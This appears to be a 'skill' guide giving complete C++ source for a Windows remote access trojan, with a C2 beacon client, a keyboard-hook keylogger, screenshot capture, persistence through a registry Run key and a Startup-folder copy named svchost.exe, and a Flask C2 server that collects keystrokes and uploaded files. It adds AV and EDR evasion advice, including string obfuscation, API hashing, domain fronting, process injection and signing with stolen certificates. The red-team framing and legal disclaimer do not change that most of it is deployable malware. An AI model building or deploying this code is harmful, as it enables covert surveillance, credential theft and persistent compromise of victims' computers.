---
description: Windows Remote Access Trojan with keylogging, screenshot, file exfil
category: security/weaponization
tags: [rat, windows, keylogger, remote-access, c++, persistence]
platform: [windows]
difficulty: advanced
tools: [mingw, visual-studio]
mitre_attack: [T1056.001, T1113, T1041, T1547.001]
---

# Windows RAT with Keylogger (C++)

## When to Use
Use when you need persistent remote access to Windows target with:
- Keystroke capture
- Screenshot capture
- File upload/download
- Command execution
- Persistence across reboots

Common scenarios:
- Red team engagements
- Penetration testing with authorization
- Security research in isolated labs

## Prerequisites
- Windows development environment (MinGW or Visual Studio)
- C++ compiler with Windows SDK
- Understanding of Windows API
- Network access from target to C2 server

## Architecture

```
Target Machine                 C2 Server
┌─────────────────┐          ┌──────────────┐
│   RAT Client    │◄────────►│  C2 Listener │
│                 │   HTTPS   │              │
│ ┌─────────────┐ │          │              │
│ │ Keylogger   │ │          │              │
│ └─────────────┘ │          │              │
│ ┌─────────────┐ │          │              │
│ │ Screenshot  │ │          │              │
│ └─────────────┘ │          │              │
│ ┌─────────────┐ │          │              │
│ │ File Exfil  │ │          │              │
│ └─────────────┘ │          │              │
│ ┌─────────────┐ │          │              │
│ │ Persistence │ │          │              │
│ └─────────────┘ │          │              │
└─────────────────┘          └──────────────┘
```

## Step-by-Step

### 1. Core RAT Client

```cpp
// rat_client.cpp
#include <windows.h>
#include <wininet.h>
#include <iostream>
#include <string>
#include <thread>
#include <vector>

#pragma comment(lib, "wininet.lib")

class RATClient {
private:
    std::string c2_url;
    std::string client_id;
    bool running;
    
    std::string HttpRequest(const std::string& endpoint, const std::string& data) {
        HINTERNET hInternet = InternetOpenA("Mozilla/5.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
        if (!hInternet) return "";
        
        std::string full_url = c2_url + endpoint;
        HINTERNET hConnect = InternetOpenUrlA(hInternet, full_url.c_str(), 
                                              data.c_str(), data.length(), 
                                              INTERNET_FLAG_RELOAD, 0);
        
        std::string response;
        if (hConnect) {
            char buffer[4096];
            DWORD bytesRead;
            while (InternetReadFile(hConnect, buffer, sizeof(buffer), &bytesRead) && bytesRead > 0) {
                response.append(buffer, bytesRead);
            }
            InternetCloseHandle(hConnect);
        }
        InternetCloseHandle(hInternet);
        return response;
    }
    
public:
    RATClient(const std::string& url) : c2_url(url), running(true) {
        // Generate unique client ID
        char computerName[256];
        DWORD size = sizeof(computerName);
        GetComputerNameA(computerName, &size);
        client_id = std::string(computerName);
    }
    
    void Beacon() {
        while (running) {
            std::string response = HttpRequest("/beacon", "id=" + client_id);
            
            if (!response.empty()) {
                ProcessCommand(response);
            }
            
            Sleep(5000); // Beacon every 5 seconds
        }
    }
    
    void ProcessCommand(const std::string& cmd) {
        if (cmd == "KEYLOG_START") {
            StartKeylogger();
        } else if (cmd == "SCREENSHOT") {
            CaptureScreenshot();
        } else if (cmd.substr(0, 4) == "EXEC") {
            ExecuteCommand(cmd.substr(5));
        } else if (cmd.substr(0, 8) == "DOWNLOAD") {
            DownloadFile(cmd.substr(9));
        }
    }
    
    void StartKeylogger();
    void CaptureScreenshot();
    void ExecuteCommand(const std::string& cmd);
    void DownloadFile(const std::string& path);
};
```

### 2. Keylogger Module

```cpp
// keylogger.cpp
#include <windows.h>
#include <string>
#include <fstream>

class Keylogger {
private:
    std::string buffer;
    HHOOK hook;
    
    static Keylogger* instance;
    
    static LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
        if (nCode >= 0 && wParam == WM_KEYDOWN) {
            KBDLLHOOKSTRUCT* kbd = (KBDLLHOOKSTRUCT*)lParam;
            
            // Convert virtual key to character
            char key[2];
            BYTE keyboardState[256];
            GetKeyboardState(keyboardState);
            
            if (ToAscii(kbd->vkCode, kbd->scanCode, keyboardState, (LPWORD)key, 0) == 1) {
                instance->buffer += key[0];
            } else {
                // Handle special keys
                switch (kbd->vkCode) {
                    case VK_RETURN: instance->buffer += "[ENTER]"; break;
                    case VK_BACK: instance->buffer += "[BACKSPACE]"; break;
                    case VK_TAB: instance->buffer += "[TAB]"; break;
                    case VK_SPACE: instance->buffer += " "; break;
                    case VK_ESCAPE: instance->buffer += "[ESC]"; break;
                    case VK_DELETE: instance->buffer += "[DEL]"; break;
                }
            }
            
            // Flush buffer when it reaches 100 chars
            if (instance->buffer.length() > 100) {
                instance->FlushBuffer();
            }
        }
        return CallNextHookEx(instance->hook, nCode, wParam, lParam);
    }
    
public:
    Keylogger() {
        instance = this;
    }
    
    void Start() {
        hook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);
        
        MSG msg;
        while (GetMessage(&msg, NULL, 0, 0)) {
            TranslateMessage(&msg);
            DispatchMessage(&msg);
        }
    }
    
    void FlushBuffer() {
        // Send buffer to C2
        // Or write to temp file for later exfil
        std::ofstream file("C:\\Windows\\Temp\\svchost.log", std::ios::app);
        file << buffer;
        file.close();
        buffer.clear();
    }
    
    std::string GetBuffer() {
        return buffer;
    }
};

Keylogger* Keylogger::instance = nullptr;
```

### 3. Screenshot Module

```cpp
// screenshot.cpp
#include <windows.h>
#include <gdiplus.h>
#include <string>

#pragma comment(lib, "gdiplus.lib")

class Screenshot {
public:
    static bool Capture(const std::string& filename) {
        // Initialize GDI+
        Gdiplus::GdiplusStartupInput gdiplusStartupInput;
        ULONG_PTR gdiplusToken;
        Gdiplus::GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);
        
        // Get screen dimensions
        int screenWidth = GetSystemMetrics(SM_CXSCREEN);
        int screenHeight = GetSystemMetrics(SM_CYSCREEN);
        
        // Create device contexts
        HDC hdcScreen = GetDC(NULL);
        HDC hdcMem = CreateCompatibleDC(hdcScreen);
        
        // Create bitmap
        HBITMAP hBitmap = CreateCompatibleBitmap(hdcScreen, screenWidth, screenHeight);
        SelectObject(hdcMem, hBitmap);
        
        // Copy screen to bitmap
        BitBlt(hdcMem, 0, 0, screenWidth, screenHeight, hdcScreen, 0, 0, SRCCOPY);
        
        // Save to file
        Gdiplus::Bitmap bitmap(hBitmap, NULL);
        CLSID pngClsid;
        GetEncoderClsid(L"image/png", &pngClsid);
        
        std::wstring wFilename(filename.begin(), filename.end());
        bitmap.Save(wFilename.c_str(), &pngClsid);
        
        // Cleanup
        DeleteObject(hBitmap);
        DeleteDC(hdcMem);
        ReleaseDC(NULL, hdcScreen);
        Gdiplus::GdiplusShutdown(gdiplusToken);
        
        return true;
    }
    
private:
    static int GetEncoderClsid(const WCHAR* format, CLSID* pClsid) {
        UINT num = 0, size = 0;
        Gdiplus::GetImageEncodersSize(&num, &size);
        
        Gdiplus::ImageCodecInfo* pImageCodecInfo = (Gdiplus::ImageCodecInfo*)(malloc(size));
        Gdiplus::GetImageEncoders(num, size, pImageCodecInfo);
        
        for (UINT i = 0; i < num; ++i) {
            if (wcscmp(pImageCodecInfo[i].MimeType, format) == 0) {
                *pClsid = pImageCodecInfo[i].Clsid;
                free(pImageCodecInfo);
                return i;
            }
        }
        free(pImageCodecInfo);
        return -1;
    }
};
```

### 4. Persistence Module

```cpp
// persistence.cpp
#include <windows.h>
#include <string>

class Persistence {
public:
    static bool InstallRegistryKey() {
        HKEY hKey;
        std::string exePath = GetCurrentExecutablePath();
        
        // HKCU\Software\Microsoft\Windows\CurrentVersion\Run
        LONG result = RegOpenKeyExA(HKEY_CURRENT_USER,
                                    "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                                    0, KEY_SET_VALUE, &hKey);
        
        if (result == ERROR_SUCCESS) {
            RegSetValueExA(hKey, "WindowsUpdate", 0, REG_SZ,
                          (BYTE*)exePath.c_str(), exePath.length() + 1);
            RegCloseKey(hKey);
            return true;
        }
        return false;
    }
    
    static bool CopyToStartup() {
        char startupPath[MAX_PATH];
        SHGetFolderPathA(NULL, CSIDL_STARTUP, NULL, 0, startupPath);
        
        std::string exePath = GetCurrentExecutablePath();
        std::string destPath = std::string(startupPath) + "\\svchost.exe";
        
        return CopyFileA(exePath.c_str(), destPath.c_str(), FALSE);
    }
    
private:
    static std::string GetCurrentExecutablePath() {
        char buffer[MAX_PATH];
        GetModuleFileNameA(NULL, buffer, MAX_PATH);
        return std::string(buffer);
    }
};
```

### 5. Main Entry Point

```cpp
// main.cpp
#include "rat_client.cpp"
#include "keylogger.cpp"
#include "screenshot.cpp"
#include "persistence.cpp"

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    // Hide console window
    HWND hwnd = GetConsoleWindow();
    ShowWindow(hwnd, SW_HIDE);
    
    // Install persistence
    Persistence::InstallRegistryKey();
    
    // Initialize RAT
    RATClient rat("http://your-c2-server.com");
    
    // Start keylogger in separate thread
    std::thread keylogThread([]() {
        Keylogger kl;
        kl.Start();
    });
    keylogThread.detach();
    
    // Start beacon loop
    rat.Beacon();
    
    return 0;
}
```

### 6. Compilation

```bash
# Using MinGW on Linux (cross-compile)
x86_64-w64-mingw32-g++ \
    -o rat.exe \
    main.cpp \
    -lwininet -lgdi32 -lgdiplus -lole32 \
    -static-libgcc -static-libstdc++ \
    -mwindows

# Using Visual Studio on Windows
cl /EHsc /Fe:rat.exe main.cpp wininet.lib gdi32.lib gdiplus.lib ole32.lib
```

### 7. C2 Server (Python)

```python
# c2_server.py
from flask import Flask, request
import sqlite3
import os

app = Flask(__name__)

# Initialize database
def init_db():
    conn = sqlite3.connect('c2.db')
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS clients
                 (id TEXT PRIMARY KEY, last_seen TIMESTAMP, keylog TEXT)''')
    conn.commit()
    conn.close()

@app.route('/beacon', methods=['POST'])
def beacon():
    client_id = request.form.get('id')
    
    # Update last seen
    conn = sqlite3.connect('c2.db')
    c = conn.cursor()
    c.execute("INSERT OR REPLACE INTO clients (id, last_seen) VALUES (?, datetime('now'))",
              (client_id,))
    conn.commit()
    conn.close()
    
    # Check for pending commands
    cmd = get_pending_command(client_id)
    return cmd

@app.route('/keylog', methods=['POST'])
def keylog():
    client_id = request.form.get('id')
    data = request.form.get('data')
    
    # Store keylog data
    conn = sqlite3.connect('c2.db')
    c = conn.cursor()
    c.execute("UPDATE clients SET keylog = keylog || ? WHERE id = ?", (data, client_id))
    conn.commit()
    conn.close()
    
    return "OK"

@app.route('/upload', methods=['POST'])
def upload():
    client_id = request.form.get('id')
    file = request.files['file']
    
    # Save uploaded file
    upload_dir = f"uploads/{client_id}"
    os.makedirs(upload_dir, exist_ok=True)
    file.save(f"{upload_dir}/{file.filename}")
    
    return "OK"

def get_pending_command(client_id):
    # In production, implement command queue
    return ""

if __name__ == '__main__':
    init_db()
    app.run(host='0.0.0.0', port=443, ssl_context='adhoc')
```

Run C2:
```bash
pip install flask pyopenssl
python c2_server.py
```

## Pitfalls & OPSEC

**Common Failures:**
- **AV/EDR Detection** — Most AVs detect common RAT patterns
  - Solution: Obfuscate strings, encrypt network traffic, use legitimate-looking names
- **Firewall blocking** — Outbound connections blocked
  - Solution: Use HTTPS on port 443, DNS tunneling, or proxy-aware code
- **Persistence removal** — Registry keys cleaned by security tools
  - Solution: Multiple persistence methods (registry + startup + scheduled task)
- **Memory scanning** — Keylogger hooks detected in memory
  - Solution: Unhook after capturing, use lower-level techniques

**Detection Risks:**
- SetWindowsHookEx triggers behavioral detection
- Outbound beacons create network signatures
- Registry modifications logged by EDR
- Screenshot API calls monitored

**OPSEC Improvements:**
- **Encrypt C2 traffic** — Use TLS + custom encryption layer
- **Domain fronting** — Hide C2 behind CDN (CloudFlare, Azure CDN)
- **Jitter beacon timing** — Random sleep intervals (3-10 seconds)
- **Legitimate process injection** — Inject into svchost.exe or explorer.exe
- **Obfuscate strings** — XOR encode URLs, filenames at compile time
- **Code signing** — Sign binary with stolen/purchased cert (advanced)

## Verification

```bash
# On target (after deployment)
# Check persistence
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run"

# Check process
tasklist | findstr rat.exe

# Check network connections
netstat -ano | findstr :443

# On C2 server
# Check active clients
curl https://your-c2.com/clients

# Send command
curl -X POST https://your-c2.com/command -d "client=TARGET_ID&cmd=SCREENSHOT"
```

## AV Evasion Techniques

### 1. String Obfuscation
```cpp
// Instead of plaintext strings
// std::string url = "http://malicious-c2.com";

// Use XOR encoding
std::string DecodeString(const char* encoded, int len, char key) {
    std::string decoded;
    for (int i = 0; i < len; i++) {
        decoded += encoded[i] ^ key;
    }
    return decoded;
}

// In code
const char encoded_url[] = {0x6f, 0x65, 0x65, 0x71, ...}; // XOR encoded
std::string c2_url = DecodeString(encoded_url, sizeof(encoded_url), 0x42);
```

### 2. API Hashing
```cpp
// Resolve Windows APIs at runtime by hash instead of name
FARPROC GetAPIByHash(DWORD hash) {
    // Implementation of API resolution by hash
    // Avoids hardcoded API imports
}
```

### 3. Polymorphic Code
```bash
# Recompile with random junk functions before each deployment
# Different binary signature every time
```

## Related Skills
- `windows-privilege-escalation` — Escalate from user to SYSTEM
- `lateral-movement-windows` — Move to other machines on network
- `av-evasion-windows` — Bypass Windows Defender and EDR
- `process-injection` — Inject into legitimate processes
- `data-exfiltration` — Covert data exfil techniques

## References
- [Windows API Documentation](https://docs.microsoft.com/en-us/windows/win32/api/)
- [MITRE ATT&CK - Input Capture](https://attack.mitre.org/techniques/T1056/)
- [Sektor7 Malware Development Course](https://institute.sektor7.net/)

---

**LEGAL WARNING:** This skill is for AUTHORIZED TESTING ONLY. Deploying RATs on systems you don't own or have written permission to test is ILLEGAL and carries severe criminal penalties.
